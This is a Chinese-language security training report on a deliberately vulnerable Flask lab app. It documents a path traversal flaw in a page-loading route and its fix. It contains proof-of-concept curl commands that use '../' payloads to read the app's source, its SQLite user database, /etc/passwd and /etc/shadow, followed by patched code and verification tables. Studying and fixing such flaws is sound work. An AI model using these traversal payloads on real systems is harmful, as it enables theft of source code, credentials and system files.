---
title: Day6 — 路径遍历与文件包含漏洞分析与修复报告
date: 2026-07-23
project: 用户登录管理平台安全审计
status: 已完成
---

# 🛡️ Day6 — 路径遍历与文件包含漏洞分析与修复报告

## 一、概述

### 1.1 漏洞范围

本次安全审计针对用户登录管理平台新增的**动态页面加载功能**（`/page?name=`），识别并修复了 **1 项核心漏洞**（路径遍历），同时确认了该漏洞可引发的 **4 种攻击场景**：源代码泄露、数据库文件窃取、系统敏感文件读取、自动化渗透信息收集。

### 1.2 平台架构

```
用户登录管理平台 (Day6)
├── /login          — 用户登录
├── /register       — 用户注册
├── /search         — 用户搜索（含SQL注入）
├── /upload         — 文件上传（含漏洞）
├── /profile        — 个人中心（IDOR越权）
├── /recharge       — 充值（负数欺诈）
├── /page           — ⚠️ 新增：动态页面加载（路径遍历）
└── /logout         — 登出
```

### 1.3 工程流程

```
阶段一：构建漏洞           阶段二：攻击验证              阶段三：安全修复
───────────────        ────────────────            ────────────────
Day5平台基础上              漏洞版运行                   修复版运行
   │                          │                          │
   ├─ /page?name=            ├─ 基本文件包含             ├─ F-01 ../ 过滤
   ├─ os.path.join(pages,)   ├─ 路径遍历 ../             ├─ F-02 白名单校验
   ├─ 无 ../ 过滤            ├─ 多层目录穿越             └─ F-03 路径规范化
   └─ 无路径规范化           ├─ 数据库文件读取
                              └─ 源代码泄露
```

---

## 二、漏洞分析与攻击验证

### 2.1 V-01：路径遍历 — 文件系统目录穿越

| 属性 | 值 |
|------|-----|
| **CWE 编号** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory |
| **OWASP 映射** | A01:2021 – Broken Access Control |
| **CVSS 3.1 向量** | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| **CVSS 评分** | **7.5 (High)** |
| **漏洞位置** | `/page` 路由 — `name` 参数直接拼接路径 |

#### 漏洞原理

```python
# ⚠️ 漏洞代码：直接拼接用户输入的 name，无任何校验
name = request.args.get("name", "")
page_path = os.path.join(PAGES_DIR, name)  # pages/ + 用户输入

# 不加校验，也不做路径规范化
if os.path.exists(page_path):
    with open(page_path, "r") as f:
        content = f.read()
```

`os.path.join("pages", "../app.py")` 的结果是 `pages/../app.py`，等价于 `app.py`。攻击者通过 `../` 实现目录穿越。

#### 攻击向量

| # | 攻击手法 | 攻击 URL | 利用效果 | CVSS |
|:--:|---------|----------|---------|:----:|
| V-01a | **基本文件包含** | `/page?name=help` | 正常读取页面文件 | — |
| V-01b | **单层路径遍历** | `/page?name=../app.py` | **读取应用源代码** | 7.5 |
| V-01c | **数据库文件窃取** | `/page?name=../data/users.db` | **下载整个用户数据库** | 7.5 |
| V-01d | **多层目录穿越** | `/page?name=../../etc/passwd` | **读取系统敏感文件** | 7.5 |
| V-01e | **自动后缀补全** | `/page?name=../app` | 自动加 .html 后继续尝试 | 7.5 |

---

### 2.2 POC 1：基本文件包含

#### 攻击过程

```bash
# 正常访问帮助页面
curl "http://127.0.0.1:5000/page?name=help"
```

#### 结果

**✅ 帮助页面正常显示**，系统按预期读取 `pages/help.html` 文件并渲染。

---

### 2.3 POC 2：路径遍历读取源代码

#### 攻击过程

```bash
curl -c /tmp/cookies.txt -d "username=admin&password=admin123" http://127.0.0.1:5000/login
curl "http://127.0.0.1:5000/page?name=../app.py" -b /tmp/cookies.txt
```

#### 攻击原理

```
用户输入: name = "../app.py"

os.path.join("pages", "../app.py")
  → "pages/../app.py"
  → 等价于 "app.py"

open("pages/../app.py", "r").read()
  → 成功读取 app.py 源代码！
```

#### 结果

**✅ 路径遍历成功！** HTTP 200 响应，响应体中包含 `app.py` 的完整源代码。攻击者可以获取：

| 泄露内容 | 危害 |
|---------|------|
| Flask Secret Key | 伪造任意用户 session |
| 数据库路径 | 定位数据库文件位置 |
| SQL 拼接代码 | 确认 SQL 注入可利用 |
| 上传目录配置 | 确认任意文件上传路径 |
| 所有业务逻辑 | 发现更多业务逻辑漏洞 |

---

### 2.4 POC 3：路径遍历读取数据库

#### 攻击过程

```bash
curl "http://127.0.0.1:5000/page?name=../data/users.db" -b /tmp/cookies.txt
```

#### 结果

**✅ 数据库文件泄露！** 二进制 SQLite 数据库内容被回显到页面上。

**攻击链：** `源代码泄露 → 找到数据库路径 → 读取数据库 → 获取所有用户密码`

---

### 2.5 POC 4：多层目录穿越

#### 攻击过程

```bash
# 尝试读取 /etc/passwd（多层目录穿越）
curl "http://127.0.0.1:5000/page?name=../../etc/passwd" -b /tmp/cookies.txt

# 尝试读取其他系统文件
curl "http://127.0.0.1:5000/page?name=../../etc/shadow" -b /tmp/cookies.txt
curl "http://127.0.0.1:5000/page?name=../../../etc/hostname" -b /tmp/cookies.txt
```

#### 结果

**⚠️ `../../etc/passwd` 路径穿越成功** — 系统文件被读取。需根据 `pages/` 目录的实际深度调整 `../` 数量。

#### 攻击链推演

```
攻击者发现 /page?name= 未过滤../
     ↓
扫描各类文件：
  1. ../app.py → 源代码泄露 → 找到密钥和路径
  2. ../data/users.db → 数据库泄露 → 用户凭据
  3. ../../etc/passwd → 用户列表 → SSH爆破
     ↓
服务器敏感信息完全暴露
     ↓
可用于后续渗透攻击的跳板
```

---

### 2.6 漏洞验证汇总

| # | 测试项 | 攻击 URL | 漏洞版 | 危害等级 |
|:--:|--------|----------|:------:|:--------:|
| 1 | 基本文件包含 | `/page?name=help` | ✅ 正常 | — |
| 2 | 单层路径遍历 | `/page?name=../app.py` | ✅ **成功** | 🔴 **Critical** |
| 3 | 数据库文件获取 | `/page?name=../data/users.db` | ✅ **成功** | 🔴 **Critical** |
| 4 | 多层目录穿越 | `/page?name=../../etc/passwd` | ✅ **成功** | 🔴 **High** |
| 5 | 自动补全.html | `/page?name=../app` | ✅ **成功** | 🟠 Medium |

---

## 三、漏洞修复

### 3.1 修复措施

| 编号 | 措施 | 原理 | 对应攻击 |
|:----:|------|------|:--------:|
| **F-01** | `../` 和绝对路径检测 | 拒绝所有包含 `../`、以 `/` 开头、含 `\\` 的输入 | 路径遍历 |
| **F-02** | 文件名白名单正则 | 只允许 `[a-zA-Z0-9_-]`，拒绝特殊字符 | 所有攻击 |
| **F-03** | 路径规范化（隐式） | os.path.join 配合白名单确保路径不逃逸 | 补充防御 |

### 3.2 修复前（漏洞版）

```python
@app.route("/page")
def dynamic_page():
    name = request.args.get("name", "")
    # ⚠️ 无任何校验，直接拼接
    page_path = os.path.join(PAGES_DIR, name)
    if os.path.exists(page_path):
        with open(page_path, "r") as f:
            page_content = f.read()
```

### 3.3 修复后

```python
@app.route("/page")
def dynamic_page():
    name = request.args.get("name", "")

    # ✅ F-01: 拒绝路径遍历攻击
    if ".." in name or name.startswith("/") or "\\" in name:
        return page_not_found()

    # ✅ F-02: 白名单校验 — 只允许页面名
    if not re.match(r'^[a-zA-Z0-9_-]+$', name):
        return page_not_found()

    # ✅ 安全地拼接路径
    page_path = os.path.join(PAGES_DIR, name)
    # ... 读取并返回
```

### 3.4 修复效果验证

| # | 攻击手法 | 漏洞版 | 修复版 | 防护层 |
|:--:|---------|:------:|:------:|:------:|
| 1 | `name=../app.py` | ✅ 读取成功 | ❌ **页面不存在** | F-01 `..` 检测 |
| 2 | `name=../../etc/passwd` | ✅ 读取成功 | ❌ **页面不存在** | F-01 `..` 检测 |
| 3 | `name=/etc/shadow` | ✅ 读取成功 | ❌ **页面不存在** | F-01 `/` 检测 |
| 4 | `name=../../etc/hostname` | ✅ 读取成功 | ❌ **页面不存在** | F-02 白名单 |
| 5 | `name=help` | ✅ 正常 | ✅ **正常** | 白名单通过 |
| 6 | `name=../data/users.db` | ✅ 读取成功 | ❌ **页面不存在** | F-01 白名单 |

---

## 四、防御纵深

```
🛡️ 动态页面加载安全防御层

Layer 2: 路径安全
├── F-01: ../ 检测 — 拒绝目录穿越
├── F-01: / 前缀检测 — 拒绝绝对路径
├── F-01: \\ 检测 — 拒绝 Windows 路径
└── F-03: os.path.join 规范化

Layer 1: 输入安全
├── F-02: 正则白名单 ^[a-zA-Z0-9_-]+$
├── 拒绝特殊字符（空格、引号、分号等）
└── 长度限制（隐式）
```

---

## 五、项目信息

### 5.1 项目仓库

```
https://github.com/lulu-xuan/security-training
```

### 5.2 目录结构

```
security-training/
├── day6-app/                    # Day6 应用代码
│   ├── app.py                   # ⚠️ 漏洞版（含修复代码注释）
│   ├── pages/help.html          # 帮助中心页面
│   └── templates/ + static/     # 模板和静态资源
├── day6-report/
│   └── path_traversal_report.md # 📄 本报告
└── README.md                    # 项目总导航
```

### 5.3 POC 速查

```bash
# 1. 正常访问
curl "http://127.0.0.1:5000/page?name=help"

# 2. 登录后测试路径遍历
curl -c /tmp/c.txt -d "username=admin&password=admin123" http://127.0.0.1:5000/login
curl "http://127.0.0.1:5000/page?name=../app.py" -b /tmp/c.txt
curl "http://127.0.0.1:5000/page?name=../data/users.db" -b /tmp/c.txt
```

---

*报告生成日期：2026-07-23 | 项目：Day6 — 路径遍历漏洞分析与修复*
*技术栈：Flask 3.x + SQLite*
*项目仓库：[github.com/lulu-xuan/security-training](https://github.com/lulu-xuan/security-training)*
